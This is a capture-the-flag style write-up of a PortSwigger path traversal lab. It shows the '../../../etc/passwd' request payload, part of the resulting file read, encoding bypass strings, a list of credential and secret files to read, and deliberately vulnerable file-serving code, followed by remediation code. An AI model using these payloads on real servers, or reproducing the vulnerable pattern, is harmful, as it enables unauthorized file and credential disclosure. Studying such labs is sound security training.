# Lab 1: File Path Traversal — Simple Case

## Executive Summary

This lab demonstrates exploitation of a file path traversal vulnerability in its most fundamental form — no encoding, no filter bypass, no obfuscation required. The application serves product images by passing a user-supplied filename parameter directly to a server-side filesystem read operation without sanitization, validation, or path restriction of any kind. By replacing the filename value with a directory traversal sequence targeting `/etc/passwd`, I navigated out of the application's intended image directory and read an arbitrary file directly from the server filesystem. The complete contents of `/etc/passwd` were returned in the HTTP response body, confirming unrestricted filesystem read access. This attack requires a single payload in a single request and demonstrates that path traversal in its simplest form is immediately exploitable when no defenses are present.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | Path Traversal |
| **Difficulty**         | Apprentice |
| **Vulnerability**      | File Path Traversal — No Input Validation or Path Restriction |
| **Risk**               | Critical - Arbitrary Server Filesystem Read, Sensitive File Disclosure |
| **Completion**         | May 2026 |

## Objective

Exploit a file path traversal vulnerability in the product image `filename` parameter to read the contents of `/etc/passwd` from the server filesystem, demonstrating unrestricted directory traversal with no filter bypass requirement.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and HTTP history analysis
- Burp Repeater for payload testing and response inspection

**Target:** `filename` query parameter in the product image serving endpoint — user-supplied value passed directly to a server-side filesystem read operation with no path validation or restriction

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "File path traversal, simple case" with Burp Suite Professional configured and actively intercepting traffic.

<img width="1920" height="983" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/3fb0fbb9-fbba-4845-8406-8cf073a0c595" />

*Lab 1 Path Traversal environment displaying the simple case challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and active (left)*

### 2. Attack Surface Identification

Browsed the shop product pages with Burp Proxy active to populate HTTP history. Reviewed captured requests and identified the image loading request as the primary attack surface. Each product image is fetched via a GET request carrying a `filename` parameter that specifies the image file to serve — a direct indication that the server is reading files from disk based on user-supplied input.

<img width="1920" height="983" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/f0ce174c-e844-44dc-9d64-1e3796e34fcb" />

*HTTP history populated with captured requests — image loading request identified and highlighted, showing the `filename` parameter carrying the image filename value as user-supplied input*

**Request Captured:**
```http
GET /image?filename=23.jpg HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Attack Surface Analysis:**
- `filename=23.jpg` — user-controlled parameter specifying a file to read from the server filesystem
- The server resolves this filename against a base directory and returns the file contents
- If the base directory is not enforced, traversal sequences in the filename value can escape it
- Inferred server-side operation:
```
file_path = BASE_DIR + filename
return read(file_path)

# With no validation:
# filename = "23.jpg"       → reads /var/www/images/23.jpg      (intended)
# filename = "../../../etc/passwd" → reads /etc/passwd           (traversal)
```

### 3. Baseline Request Validation

Forwarded the image request to Burp Repeater and sent the original unmodified request to establish a baseline response.

<img width="1920" height="983" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/e5b03db9-6005-45d4-a412-fb95d814958f" />

*Original image request sent in Repeater — 200 OK response returns raw image binary data. Response metadata indicates the image was created with Adobe Photoshop, confirming the server is reading and returning actual files from disk. File serving mechanism confirmed operational*

**Response:** 200 OK — raw image binary data returned.

**Significant Detail:** The raw response body contained file metadata indicating the image originated from Adobe Photoshop. This confirms the server is reading actual files from disk and returning their raw contents without filtering or transformation — exactly the behavior that makes path traversal viable. A server that rewrites or validates file contents before serving them would behave differently.

**Inferred Server-Side Logic:**
```python
# Simplified representation of vulnerable file-serving code
base_dir = "/var/www/images/"
filename = request.GET["filename"]          # User-controlled — no validation
file_path = base_dir + filename            # Direct concatenation
return open(file_path, "rb").read()        # Reads whatever path resolves to
```

### 4. Path Traversal Attack

With the file serving mechanism confirmed, replaced the `filename` parameter value entirely with a directory traversal sequence targeting `/etc/passwd` — a standard Linux file containing system account information and a reliable target for confirming arbitrary file read capability.

**Attack Payload:**
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Traversal Logic:**

The server concatenates the base directory with the supplied filename. Each `../` sequence moves one directory level up the filesystem tree:

```
Base directory:    /var/www/images/
Supplied filename: ../../../etc/passwd

Path resolution:
  /var/www/images/ + ../  →  /var/www/
  /var/www/        + ../  →  /var/
  /var/            + ../  →  /
  /                + etc/passwd  →  /etc/passwd

Final resolved path: /etc/passwd
```

Three `../` sequences are sufficient to traverse from the typical web images directory to the filesystem root, from which `/etc/passwd` is then specified directly. The exact number of traversal sequences needed depends on the depth of the base directory — three is a safe starting point for a standard Linux web server directory structure and was confirmed correct here.


<img width="1920" height="983" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/5d628aa9-21b3-4fc6-8d80-51be4765deb9" />

*Path traversal payload `../../../etc/passwd` submitted — 200 OK response returns the complete contents of `/etc/passwd` including system account entries for root, bin, sys, daemon, and all other configured accounts. Arbitrary filesystem read confirmed*

**Response:** 200 OK — full contents of `/etc/passwd` returned.

**Response Contents Included:**
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
sys:x:2:2:sys:/sbin:/sbin/nologin
daemon:x:3:3:daemon:/sbin:/sbin/nologin
[all remaining account entries...]
```

**Attack Confirmed:**
- Server accepted `../` sequences in the filename parameter without restriction
- Path traversal resolved successfully to `/etc/passwd`
- Complete file contents returned in HTTP response body
- Arbitrary filesystem read access demonstrated

### 5. Lab Objective Achieved

<img width="1920" height="983" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/65fd5da3-a639-42a5-990a-9615b7363389" />


*Lab completion screen — "Congratulations, you solved the lab!" confirming successful exploitation of the file path traversal vulnerability*

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.1)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerability:**

**CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)**
- User-supplied `filename` parameter passed directly to a filesystem read operation
- No validation, sanitization, or canonicalization applied to the parameter value
- No enforcement of a permitted base directory — the filesystem resolves paths freely
- `../` sequences accepted and processed by the underlying OS path resolution

**Complete Attack Chain:**

```
Product Image Filename Parameter Identified
        ↓
Baseline Request Confirms File Served Directly from Disk
        ↓
../../../etc/passwd Substituted as Filename Value
        ↓
Server Concatenates Base Directory + Traversal Payload
        ↓
OS Path Resolution Traverses to Filesystem Root
        ↓
/etc/passwd Read and Returned in HTTP Response
        ↓
Arbitrary Filesystem Read Access Confirmed
```

**What Path Traversal Exposes on a Linux Server:**

`/etc/passwd` is the standard proof-of-concept target because it is world-readable and universally present. In a real engagement, the same technique reads any file the web server process has permission to access:

| Target File | Contents | Consequence |
|-------------|----------|-------------|
| `/etc/passwd` | System account names and UIDs (used here) | User enumeration, account mapping |
| `/etc/shadow` | Hashed passwords (if server runs as root) | Offline password cracking |
| `/etc/hosts` | Internal network hostname mappings | Network reconnaissance |
| `~/.ssh/id_rsa` | SSH private key (if readable) | Direct server authentication |
| `/proc/self/environ` | Process environment variables | API keys, database credentials, secrets |
| `/var/www/html/config.php` | Application configuration | Database credentials, API keys |
| Application source files | Business logic, credentials | Full application compromise |
| Log files | Access logs, error logs | User behavior, internal paths, stack traces |

The severity of path traversal scales directly with what files the web server process account can read. In the worst case — a server running as root — the entire filesystem is readable.

**Why This Attack Requires No Bypass:**

This is the simplest variant of path traversal. The application applies no defenses whatsoever:

- No stripping of `../` sequences
- No encoding normalization
- No canonicalization of the resolved path
- No allowlist of permitted filenames
- No restriction of the resolved path to a permitted base directory

More hardened applications attempt to filter `../` sequences or restrict the resolved path, requiring bypass techniques such as URL encoding (`%2e%2e%2f`), double encoding (`%252e%252e%252f`), null byte injection, or operating system path quirks. None of these are needed here — the raw traversal sequence is accepted and processed directly.

**Filesystem Read vs. Write Access:**

Path traversal vulnerabilities most commonly provide read access — exploiting file-serving or file-download endpoints that open files for reading. Write access is possible when the vulnerable code path writes to a user-supplied path (file upload destinations, log file paths, configuration file writes), which can escalate to remote code execution by writing attacker-controlled content to executable locations such as web shell files under the web root or cron jobs.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Parameter identification: any endpoint serving files or resources by user-supplied name is a path traversal candidate
- Baseline request first: confirm the file serving mechanism before modifying the payload
- Response metadata analysis: Adobe Photoshop metadata in the raw response confirmed the server was reading real files from disk
- Direct traversal before bypass: always attempt the simplest form first — many applications apply no defenses
- Target selection: `/etc/passwd` as the standard proof-of-concept file — universally present, world-readable, clearly demonstrates impact

**Critical Security Insights:**

**1. Any User-Supplied Filename Is a Path Traversal Candidate:**
File-serving endpoints, image loaders, document downloaders, log viewers, and configuration readers all share the same fundamental pattern: a user-supplied value used to construct a filesystem path. Every such parameter should be treated as a path traversal candidate until proven otherwise. The `filename`, `file`, `path`, `resource`, `template`, `doc`, and `img` parameter names are the most common but any parameter feeding a file operation is in scope.

**2. The Operating System Resolves Paths — The Application Cannot Always Predict the Result:**
A common misconception is that simply checking whether the supplied path "starts with" the intended base directory is sufficient. Without canonicalization, an attacker can construct paths that satisfy a prefix check while still escaping the intended directory:

```python
# Insufficient check — bypassed by traversal
if filename.startswith("/var/www/images/"):
    return open(filename).read()

# Payload: /var/www/images/../../../etc/passwd
# Passes the prefix check — still reads /etc/passwd after OS resolution
```

The OS resolves the path after the check is applied. The check operates on the unresolved string, not the actual filesystem path.

**3. The Correct Fix Requires Path Canonicalization Before Validation:**

**Vulnerable Pattern:**
```python
base_dir = "/var/www/images/"
file_path = base_dir + filename
return open(file_path, "rb").read()
```

**Secure Pattern:**
```python
import os

base_dir = "/var/www/images/"
# Canonicalize — resolve all ../, symlinks, and relative components
canonical_path = os.path.realpath(os.path.join(base_dir, filename))

# Validate the canonical path starts with the intended base directory
if not canonical_path.startswith(os.path.realpath(base_dir)):
    raise PermissionError("Access denied")

return open(canonical_path, "rb").read()
```

`os.path.realpath()` resolves all `../` sequences, symlinks, and relative path components before the validation check is applied, ensuring the check operates on the actual filesystem path the OS would use. An attacker-supplied traversal sequence resolves to its true destination before the prefix check runs, and is rejected if that destination falls outside the permitted base directory.

**4. Prefer Indirect File References Over Direct Filename Parameters:**
The most robust remediation eliminates user-controlled filesystem paths entirely. Instead of accepting a filename from the user and reading that file, the application maintains an internal mapping from user-supplied identifiers to actual filesystem paths:

```python
# Secure — user never controls a filesystem path
IMAGE_MAP = {
    "23": "/var/www/images/product_23.jpg",
    "24": "/var/www/images/product_24.jpg",
}

image_id = request.GET["id"]
file_path = IMAGE_MAP.get(image_id)
if file_path is None:
    return 404
return open(file_path, "rb").read()
```

No traversal sequence in `image_id` can produce a valid mapping key — the user-supplied value never reaches the filesystem path construction logic.

**5. Least Privilege for the Web Server Process:**
As a defense-in-depth measure, the web server process should run under a dedicated low-privilege account with filesystem access restricted to only the directories it legitimately requires. Even if path traversal succeeds, a properly privilege-separated process cannot read `/etc/shadow`, SSH keys, or other sensitive files outside its permitted scope. This limits blast radius without addressing the root cause.

## References

1. PortSwigger Web Security Academy - Path Traversal
2. OWASP Top 10 (2021) - A01: Broken Access Control
3. CWE-22 - Improper Limitation of a Pathname to a Restricted Directory
4. OWASP Path Traversal Attack Reference
5. OWASP File Upload Cheat Sheet
6. Linux Filesystem Hierarchy Standard - /etc/passwd

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to server filesystems, reading protected files, or exploiting path traversal vulnerabilities against systems without explicit written authorization is illegal under applicable laws worldwide.
